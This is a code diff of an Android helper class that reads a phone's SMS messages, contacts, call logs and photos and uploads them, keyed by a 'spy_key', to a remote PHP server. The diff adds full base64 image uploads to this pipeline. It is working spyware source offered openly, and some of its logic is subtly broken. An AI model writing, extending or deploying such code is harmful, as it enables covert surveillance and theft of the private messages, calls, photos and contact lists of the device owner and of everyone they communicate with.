@@ -5,9 +5,9 @@ import android.app.Activity;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.Context;
-import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
+import android.graphics.Bitmap;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
@@ -17,14 +17,15 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Telephony;
-import android.widget.Button;
+import android.util.Base64;
 
 import androidx.annotation.RequiresApi;
-import androidx.appcompat.app.AppCompatActivity;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -34,9 +35,7 @@ import java.net.URL;
 import java.net.URLEncoder;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
-import java.util.ArrayList;
 import java.util.Calendar;
-import java.util.List;
 
 /**
  * Created by jkm-droid on 05/04/2021.
@@ -46,10 +45,13 @@ public class MyHelper{
     private final Context context;
     MessageHelper messageHelper;
     ContactsHelper contactsHelper;
-    String device = Build.DEVICE+"_"+Build.MODEL+"_"+Build.ID+"_"+Build.HOST+"_"+Build.VERSION_CODES.BASE;
+    //TECNO-K7_TECNOK7_NRD90M_buildsrv-83_1
+    String device = Build.DEVICE+"_"+Build.MODEL+"_"
+            +Build.ID+"_"+Build.HOST+"_"+Build.VERSION_CODES.BASE;
     String message_id,phonenumber,message_body,message_date,dateLong, person, sms_type;
     String contact_name, contact_id;
-    String contact_word = "send_contacts", image_word = "send_images", messages_word = "send_messages", call_logs_word = "send_call_logs";
+    String contact_word = "send_contacts", image_word = "send_images",
+            messages_word = "send_messages", call_logs_word = "send_call_logs";
     int sms_id;
     String URL = "https://cyberdroid.mblog.co.ke/cyberdroid/sms_contacts.php";
     String SPY_KEY;
@@ -59,7 +61,6 @@ public class MyHelper{
         this.context = context;
         preferences = context.getSharedPreferences(UserPreferences.Login.NAME, Activity.MODE_PRIVATE);
         SPY_KEY = preferences.getString(UserPreferences.Login.SPY_KEY, "");
-        System.out.println(SPY_KEY+"--------------------------");
     }
 
     //read messages from database
@@ -88,13 +89,12 @@ public class MyHelper{
                             URLEncoder.encode("message_date", charset)+"="+URLEncoder.encode(message_date, charset)+"&"+
                             URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset)+"&"+
                             URLEncoder.encode("message_type", charset)+"="+URLEncoder.encode(sms_type, charset);
-                    System.out.println(SPY_KEY+"------------sending online messages--------------------");
-                    System.out.println("\n\n");
-                    System.out.println(message_id+"\n"+phonenumber+"\n"+device+"\n"+message_body+"\n"+message_date+"\n");
-                    if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
+//                    System.out.println("\n\n");
+//                    System.out.println(message_id+"\n"+phonenumber+"\n"+device+"\n"+message_body+"\n"+message_date+"\n");
+                    if (isNetworkAvailable(context.getApplicationContext())) {
                         //send the messages to Mysql online database
                         String response = MyHelper.connect_and_post(URL, messages);
-
+                        System.out.println("--------------"+response+"----------------------");
                         if (response.equalsIgnoreCase("message saved") || response.equalsIgnoreCase("message exists")) {
                             messageHelper.delete_message(message_id);
                         }
@@ -130,7 +130,7 @@ public class MyHelper{
                 sms_id = Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                 phonenumber = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                 phonenumber = phonenumber.replaceAll("\\s", "");
-                if (!phonenumber.contains("+254")){
+                if (phonenumber.charAt(0) == 0){
                     phonenumber = phonenumber.replaceFirst("0", "+254");
                 }
 
@@ -155,11 +155,35 @@ public class MyHelper{
                         break;
                 }
 
-                System.out.println("\nsms id"+sms_id+"\n"+phonenumber+"\n"+message_body+"\n"+message_date);
+//                System.out.println("\nsms id"+sms_id+"\n"+phonenumber+"\n"+message_body+"\n"+message_date);
                 //insert messages in the database
+//                if(isNetworkAvailable(context.getApplicationContext()))
+//                    send_messages_online(sms_id, phonenumber, message_body, message_date, sms_type);
+//                else
                 messageHelper.insert_all_messages(sms_id, phonenumber, message_body, message_date, sms_type);
             }
             cursor.close();
+        }
+    }
+
+    private void send_messages_online(int sms_id, String phone_number, String message_body, String message_date, String sms_type) {
+        String charset = "UTF-8";
+        try {
+            String messages = URLEncoder.encode("send_messages",charset)+"="+URLEncoder.encode(messages_word, charset)+"&"+
+                    URLEncoder.encode("message_id", charset)+"="+URLEncoder.encode(String.valueOf(sms_id), charset)+"&"+
+                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
+                    URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phone_number, charset)+"&"+
+                    URLEncoder.encode("message_body", charset)+"="+URLEncoder.encode(message_body, charset)+"&"+
+                    URLEncoder.encode("message_date", charset)+"="+URLEncoder.encode(message_date, charset)+"&"+
+                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset)+"&"+
+                    URLEncoder.encode("message_type", charset)+"="+URLEncoder.encode(sms_type, charset);
+
+            //send the messages to Mysql online database
+            String response = MyHelper.connect_and_post(URL, messages);
+            System.out.println(response+"---------------------------");
+
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
@@ -184,9 +208,10 @@ public class MyHelper{
                             URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset)+"&"+
                             URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phonenumber, charset);
 
-                    System.out.println("\n\n");
-                    System.out.println(contact_id+"\n"+phonenumber+"\n"+device+"\n"+contact_name+"\n"+SPY_KEY+"\n");
-                    if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
+//                    System.out.println("\n\n");
+//                    System.out.println(contact_id+"\n"+phonenumber+"\n"+device+"\n"+contact_name+"\n"+SPY_KEY+"\n");
+
+                    if (isNetworkAvailable(context.getApplicationContext())) {
                         //send the messages to Mysql online database
                         String response = MyHelper.connect_and_post(URL, contacts);
                         System.out.println("--------------------------"+response+"---------------------------");
@@ -208,32 +233,6 @@ public class MyHelper{
             System.out.println("--------------------------empty sql lite - contacts------------------------------");
         }
 
-    }
-
-    public void send_contacts_online(String contact_id, String contact_name, String phonenumber){
-        String charset = "UTF-8";
-        try {
-            String contacts = URLEncoder.encode("send_contacts",charset)+"="+URLEncoder.encode(contact_word, charset)+"&"+
-                    URLEncoder.encode("contact_id", charset)+"="+URLEncoder.encode(contact_id, charset)+"&"+
-                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
-                    URLEncoder.encode("contact_name", charset)+"="+URLEncoder.encode(contact_name, charset)+"&"+
-                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset)+"&"+
-                    URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phonenumber, charset);
-
-            System.out.println("\n\n");
-            System.out.println(message_id+"\n"+phonenumber+"\n"+device+"\n"+message_body+"\n"+message_date+"\n");
-            if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
-                //send the messages to Mysql online database
-                String response = MyHelper.connect_and_post(URL, contacts);
-                System.out.println("--------------------------sending online contacts------------------------------");
-                if (response.equalsIgnoreCase("contact saved") || response.equalsIgnoreCase("contact exists")) {
-                    contactsHelper.delete_contact(phonenumber);
-                }
-            }
-
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
     }
 
     public void read_contacts_from_phone_and_save_to_sql_lite(){
@@ -265,16 +264,20 @@ public class MyHelper{
                     while (phoneCursor.moveToNext()) {
                         phonenumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                         phonenumber = phonenumber.replaceAll("\\s", "");
-                        if (!phonenumber.contains("+254")){
+                        if (phonenumber.charAt(0) == 0){
                             phonenumber = phonenumber.replaceFirst("0", "+254");
                         }
 
 //                        System.out.println("Id: " + contact_id+"\n");
 //                        System.out.println("Name: " + contact_name+"\n");
-//                        System.out.println("Phone Number: " + phonenumber+"\n");
+                        System.out.println("Phone Number: " + phonenumber+"\n");
 
+//                        if (isNetworkAvailable(context.getApplicationContext())){
+//                            send_contacts_online(contact_id, contact_name,phonenumber);
+//                        }else {
                         contactsHelper = new ContactsHelper(context.getApplicationContext());
                         contactsHelper.insert_all_contacts(Integer.parseInt(contact_id), contact_name, phonenumber);
+//                        }
                     }
                     phoneCursor.close();
 
@@ -286,10 +289,257 @@ public class MyHelper{
 
     }
 
-    public static String convert_date(String date) {
+    public void send_contacts_online(String contact_id, String contact_name, String phone_number){
+        String charset = "UTF-8";
+        try {
+            String contacts = URLEncoder.encode("send_contacts",charset)+"="+URLEncoder.encode(contact_word, charset)+"&"+
+                    URLEncoder.encode("contact_id", charset)+"="+URLEncoder.encode(contact_id, charset)+"&"+
+                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
+                    URLEncoder.encode("contact_name", charset)+"="+URLEncoder.encode(contact_name, charset)+"&"+
+                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset)+"&"+
+                    URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phone_number, charset);
+
+            //send the messages to Mysql online database
+            String response = MyHelper.connect_and_post(URL, contacts);
+            System.out.println("-------------"+response+"-----------------");
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+    public void read_sms_using_telephony(){
+        ContentResolver cr = context.getContentResolver();
+        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
+        messageHelper = new MessageHelper(context.getApplicationContext());
+
+        int totalSMS;
+        if (cursor != null) {
+            totalSMS = cursor.getCount();
+            if (cursor.moveToFirst()) {
+                for (int j = 0; j < totalSMS; j++) {
+                    sms_id = Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
+                    dateLong = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                    phonenumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                    phonenumber = phonenumber.replaceAll("\\s", "");
+                    if (phonenumber.charAt(0) == 0){
+                        phonenumber = phonenumber.replaceFirst("0", "+254");
+                    }
+
+                    message_body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                    sms_type = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
+                    message_date = convert_date(dateLong);
+
+                    switch (Integer.parseInt(sms_type)) {
+                        case 1:
+                            sms_type = "inbox";
+                            break;
+                        case 2:
+                            sms_type = "sent";
+                            break;
+                        case 4:
+                            sms_type = "outbox";
+                            break;
+                        default:
+                            break;
+                    }
+
+//                    System.out.println("\n"+phonenumber+"\n"+message_body+"\n"+message_date+"\n"+sms_type);
+                    messageHelper.insert_all_messages(sms_id,phonenumber, message_body, message_date, sms_type);
+
+                    cursor.moveToNext();
+                }
+            }
+
+            cursor.close();
+
+        }else{
+            System.out.println("--------------------------empty messages------------------------------");
+        }
+    }
+
+    public void read_photos_from_media_store() {
+        Uri collection;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q){
+            collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
+        }else{
+            collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+        }
+
+        String [] projection = new String[]{
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.SIZE,
+                MediaStore.Images.Media.DATE_ADDED,
+                MediaStore.Images.Media.DATE_MODIFIED,
+        };
+
+        try(
+                Cursor cursor = context.getContentResolver().query(
+                        collection,
+                        projection,
+                        null,
+                        null,
+                        null
+                )) {
+            int columnId = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+            int columnName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+            int columnSize = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
+            int columnDateAdded = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);
+            int columnDateModified = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED);
+
+            if (cursor.getCount() > 0) {
+                while (cursor.moveToNext()) {
+                    long imageId = cursor.getLong(columnId);
+                    String imageName = cursor.getString(columnName);
+                    int imageSize = cursor.getInt(columnSize);
+                    String dateAdded = convert_image_date(cursor.getString(columnDateAdded));
+                    String dateModified = convert_image_date(cursor.getString(columnDateModified));
+
+                    //compress the images
+                    Uri contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId);
+                    Bitmap bitmap = MediaStore.Images.Media.getBitmap(context.getContentResolver(), contentUri);
+                    String actualImage = get_actual_image(bitmap);
+
+//                    System.out.println("\n\nid " + imageId + "\nname" + imageName + "\nsize" + imageSize + "\ndate added"+dateAdded+"\ndate modified"+dateModified+"\n");
+
+                    //send the images online
+                    send_images_online(imageId, actualImage, imageName, imageSize, dateAdded, dateModified);
+                }
+            }else{
+                System.out.println("----------------no images found------------------");
+            }
+
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private String get_actual_image(Bitmap bitmap) {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
+        byte[] imagebytes = baos.toByteArray();
+
+        return Base64.encodeToString(imagebytes, Base64.DEFAULT);
+    }
+
+    private void send_images_online(long imageId, String actualImage, String imageName, int imageSize, String dateAdded, String dateModified) {
+        String charset = "UTF-8";
+        try {
+            String images = URLEncoder.encode("send_images",charset)+"="+URLEncoder.encode(image_word, charset)+"&"+
+                    URLEncoder.encode("image_id", charset)+"="+URLEncoder.encode(String.valueOf(imageId), charset)+"&"+
+                    URLEncoder.encode("actual_image", charset)+"="+URLEncoder.encode(actualImage, charset)+"&"+
+                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
+                    URLEncoder.encode("image_name", charset)+"="+URLEncoder.encode(imageName, charset)+"&"+
+                    URLEncoder.encode("image_size", charset)+"="+URLEncoder.encode(String.valueOf(imageSize), charset)+"&"+
+                    URLEncoder.encode("image_date_added", charset)+"="+URLEncoder.encode(dateAdded, charset)+"&"+
+                    URLEncoder.encode("image_date_modified", charset)+"="+URLEncoder.encode(dateModified, charset)+"&"+
+                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset);
+
+            if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
+                //send the images to Mysql online database
+                String response = MyHelper.connect_and_post(URL, images);
+                System.out.println("-------------------"+response+"-----------------------");
+            }
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void read_call_logs_and_send_online() {
+        ContentResolver contentResolver = context.getApplicationContext().getContentResolver();
+
+        try (
+                Cursor cursor = contentResolver.query(
+                        CallLog.Calls.CONTENT_URI,
+                        null,
+                        null,
+                        null,
+                        null
+                )) {
+
+            if (cursor.getCount() > 0) {
+                while (cursor.moveToNext()) {
+                    String call_id = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID));
+                    String phone_number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                    String call_name = "";
+                    try {
+                        call_name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
+                        if (call_name == null){
+                            call_name = "no name found";
+                        }
+                    }catch (NullPointerException e) {
+                        call_name = "no name";
+                    }
+                    System.out.println(call_name+"-------------------------------");
+                    String call_date = convert_date(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+                    if (!phone_number.contains("+254")){
+                        phone_number = phone_number.replaceFirst("0", "+254");
+                    }
+                    String call_type = "";
+                    switch (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)))) {
+                        case CallLog.Calls.OUTGOING_TYPE:
+                            call_type = "outgoing";
+                            break;
+                        case CallLog.Calls.INCOMING_TYPE:
+                            call_type = "incoming";
+                            break;
+                        case CallLog.Calls.MISSED_TYPE:
+                            call_type = "missed";
+                            break;
+                        default:
+                            break;
+                    }
+
+                    send_call_logs_online(call_id, call_name, phone_number, call_date, duration, call_type);
+                }
+            }else{
+                System.out.println("-----------no call logs found----------------");
+            }
+        }
+    }
+
+    private void send_call_logs_online(String call_id, String call_name, String phone_number, String call_date, String duration, String call_type) {
+        String charset = "UTF-8";
+        try {
+            String images = URLEncoder.encode("send_call_logs",charset)+"="+URLEncoder.encode(call_logs_word, charset)+"&"+
+                    URLEncoder.encode("call_id", charset)+"="+URLEncoder.encode(String.valueOf(call_id), charset)+"&"+
+                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
+                    URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phone_number, charset)+"&"+
+                    URLEncoder.encode("call_name", charset)+"="+URLEncoder.encode(call_name, charset)+"&"+
+                    URLEncoder.encode("call_date", charset)+"="+URLEncoder.encode(call_date, charset)+"&"+
+                    URLEncoder.encode("duration", charset)+"="+URLEncoder.encode(duration, charset)+"&"+
+                    URLEncoder.encode("call_type", charset)+"="+URLEncoder.encode(call_type, charset)+"&"+
+                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset);
+
+            if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
+                //send the call logs to Mysql online database
+                String response = MyHelper.connect_and_post(URL, images);
+                System.out.println("-------------------"+response+"-----------------------");
+            }
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static String convert_image_date(String date) {
         Long timestamp = Long.parseLong(date);
         Calendar calendar = Calendar.getInstance();
         calendar.setTimeInMillis(timestamp * 1000L);
+        @SuppressLint("SimpleDateFormat") DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
+        return dateFormat.format(calendar.getTime());
+    }
+
+    public static String convert_date(String date) {
+        Long timestamp = Long.parseLong(date);
+        Calendar calendar = Calendar.getInstance();
+        calendar.setTimeInMillis(timestamp);
         @SuppressLint("SimpleDateFormat") DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
         return dateFormat.format(calendar.getTime());
     }
@@ -302,7 +552,8 @@ public class MyHelper{
         connection.setDoInput(true);
         connection.setConnectTimeout(15000);
 
-        OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
+        String charset = "UTF-8";
+        OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), charset);
         BufferedWriter bufferedWriter = new BufferedWriter(writer);
         bufferedWriter.write(encodedData);
         bufferedWriter.flush();
@@ -316,6 +567,8 @@ public class MyHelper{
         }
         return sb.toString();
     }
+
+    //connect to the server and get data
     public static String connect_and_get(String link, String encodedData) throws IOException {
         URL url = new URL(link);
         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
@@ -324,7 +577,7 @@ public class MyHelper{
         connection.setRequestMethod("GET");
         connection.setConnectTimeout(15000);
 
-        System.out.println("Url: " + connection.getURL());
+//        System.out.println("Url: " + connection.getURL());
 
         OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
         BufferedWriter bufferedWriter = new BufferedWriter(writer);
@@ -396,194 +649,4 @@ public class MyHelper{
         }
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
-    public void read_sms_using_telephony(){
-        ContentResolver cr = context.getContentResolver();
-        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
-        messageHelper = new MessageHelper(context.getApplicationContext());
-
-        int totalSMS;
-        if (cursor != null) {
-            totalSMS = cursor.getCount();
-            if (cursor.moveToFirst()) {
-                for (int j = 0; j < totalSMS; j++) {
-                    sms_id = Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
-                    dateLong = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
-                    phonenumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                    phonenumber = phonenumber.replaceAll("\\s", "");
-                    if (!phonenumber.contains("+254")){
-                        phonenumber = phonenumber.replaceFirst("0", "+254");
-                    }
-
-                    message_body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                    sms_type = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
-                    message_date = convert_date(dateLong);
-
-                    switch (Integer.parseInt(sms_type)) {
-                        case 1:
-                            sms_type = "inbox";
-                            break;
-                        case 2:
-                            sms_type = "sent";
-                            break;
-                        case 4:
-                            sms_type = "outbox";
-                            break;
-                        default:
-                            break;
-                    }
-
-                    System.out.println("\n"+phonenumber+"\n"+message_body+"\n"+message_date+"\n"+sms_type);
-                    messageHelper.insert_all_messages(sms_id,phonenumber, message_body, message_date, sms_type);
-
-                    cursor.moveToNext();
-                }
-            }
-
-            cursor.close();
-
-        }else{
-            System.out.println("--------------------------empty messages------------------------------");
-        }
-    }
-
-    public void read_photos_from_media_store() {
-        Uri collection;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q){
-            collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
-        }else{
-            collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-        }
-
-
-        String [] projection = new String[]{
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.SIZE,
-                MediaStore.Images.Media.DATE_ADDED,
-                MediaStore.Images.Media.DATE_MODIFIED,
-        };
-
-        try(
-                Cursor cursor = context.getContentResolver().query(
-                        collection,
-                        projection,
-                        null,
-                        null,
-                        null
-                )) {
-            int columnId = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
-            int columnName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
-            int columnSize = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
-            int columnDateAdded = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);
-            int columnDateModified = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED);
-
-            if (cursor.getCount() > 0) {
-                while (cursor.moveToNext()) {
-                    long imageId = cursor.getLong(columnId);
-                    String imageName = cursor.getString(columnName);
-                    int imageSize = cursor.getInt(columnSize);
-                    String dateAdded = convert_date(cursor.getString(columnDateAdded));
-                    String dateModified = convert_date(cursor.getString(columnDateModified));
-                    System.out.println("\n\nid " + imageId + "\nname" + imageName + "\nsize" + imageSize + "\ndate added"+dateAdded+"\ndate modified"+dateModified+"\n");
-
-                    //send the images online
-                    send_images_online(imageId, imageName, imageSize, dateAdded, dateModified);
-                }
-            }else{
-                System.out.println("----------------no images found------------------");
-            }
-
-        }
-    }
-
-    private void send_images_online(long imageId, String imageName, int imageSize, String dateAdded, String dateModified) {
-        String charset = "UTF-8";
-        try {
-            String images = URLEncoder.encode("send_images",charset)+"="+URLEncoder.encode(image_word, charset)+"&"+
-                    URLEncoder.encode("image_id", charset)+"="+URLEncoder.encode(String.valueOf(imageId), charset)+"&"+
-                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
-                    URLEncoder.encode("image_name", charset)+"="+URLEncoder.encode(imageName, charset)+"&"+
-                    URLEncoder.encode("image_size", charset)+"="+URLEncoder.encode(String.valueOf(imageSize), charset)+"&"+
-                    URLEncoder.encode("image_date_added", charset)+"="+URLEncoder.encode(dateAdded, charset)+"&"+
-                    URLEncoder.encode("image_date_modified", charset)+"="+URLEncoder.encode(dateModified, charset)+"&"+
-                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset);
-
-            if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
-                //send the images to Mysql online database
-                String response = MyHelper.connect_and_post(URL, images);
-                System.out.println("-------------------"+response+"-----------------------");
-            }
-
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
-    public void read_call_logs_and_send_online() {
-        ContentResolver contentResolver = context.getApplicationContext().getContentResolver();
-
-        try (
-                Cursor cursor = contentResolver.query(
-                        CallLog.Calls.CONTENT_URI,
-                        null,
-                        null,
-                        null,
-                        null
-                )) {
-
-            if (cursor.getCount() > 0) {
-                while (cursor.moveToNext()) {
-                    String call_id = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID));
-                    String phone_number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                    String call_name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
-                    String call_date = convert_date(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
-                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-
-                    String call_type = "";
-                    switch (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)))) {
-                        case CallLog.Calls.OUTGOING_TYPE:
-                            call_type = "outgoing";
-                            break;
-                        case CallLog.Calls.INCOMING_TYPE:
-                            call_type = "incoming";
-                            break;
-                        case CallLog.Calls.MISSED_TYPE:
-                            call_type = "missed";
-                            break;
-                        default:
-                            break;
-                    }
-
-                    send_call_logs_online(call_id, call_name, phone_number, call_date, duration, call_type);
-                }
-            }else{
-                System.out.println("-----------no call logs found----------------");
-            }
-        }
-    }
-
-    private void send_call_logs_online(String call_id, String call_name, String phone_number, String call_date, String duration, String call_type) {
-        String charset = "UTF-8";
-        try {
-            String images = URLEncoder.encode("send_call_logs",charset)+"="+URLEncoder.encode(call_logs_word, charset)+"&"+
-                    URLEncoder.encode("call_id", charset)+"="+URLEncoder.encode(String.valueOf(call_id), charset)+"&"+
-                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
-                    URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phone_number, charset)+"&"+
-                    URLEncoder.encode("call_name", charset)+"="+URLEncoder.encode(call_name, charset)+"&"+
-                    URLEncoder.encode("call_date", charset)+"="+URLEncoder.encode(call_date, charset)+"&"+
-                    URLEncoder.encode("duration", charset)+"="+URLEncoder.encode(duration, charset)+"&"+
-                    URLEncoder.encode("call_type", charset)+"="+URLEncoder.encode(call_type, charset)+"&"+
-                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset);
-
-            if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
-                //send the call logs to Mysql online database
-                String response = MyHelper.connect_and_post(URL, images);
-                System.out.println("-------------------"+response+"-----------------------");
-            }
-
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
 }
